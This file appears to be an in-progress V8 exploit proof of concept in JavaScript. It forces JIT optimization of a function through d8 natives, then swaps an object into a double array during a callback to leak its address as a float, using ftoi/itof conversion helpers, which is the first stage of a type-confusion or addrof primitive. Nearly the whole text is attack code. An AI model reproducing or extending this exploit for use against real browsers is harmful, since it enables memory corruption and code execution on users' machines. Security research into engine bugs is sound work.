var buf = new ArrayBuffer(64);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u8_buf = new Uint8Array(buf);

function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

function createArray(len, item){
    res = [item];
    for(let i = 1; i < len; i++){
        res[i] = item;
    }
    return res;
}

var dp = (a) => %DebugPrint(a);

function build_foo(){
    return {a:{runme:false, b:1.2, c:1.2}};
}

function foo(arr, cb, i) {
    var temp = arr[0];
    cb();


    return arr[i];
}

function opttest() {
    let x = Array(23).fill(1.2);
    for (var i = 0; i < 100000; i++) {
        var o = foo(x,function(){}, 1);
    }
}
  
opttest();
  

var x = Array(23).fill(1.2);
gc();
gc();
foo(x, function(){}, 1);
%PrepareFunctionForOptimization(foo);
foo(x, function(){}, 1);
%OptimizeFunctionOnNextCall(foo);
foo(x, function(){}, 1);
print("trying weird");

var leakme = {a:2};


var res = foo(x, function() {
    x[10] = leakme;
    print("hello");
}, 5);

print(ftoi(res).toString(16));

dp(leakme)
dp(x);

print("Done");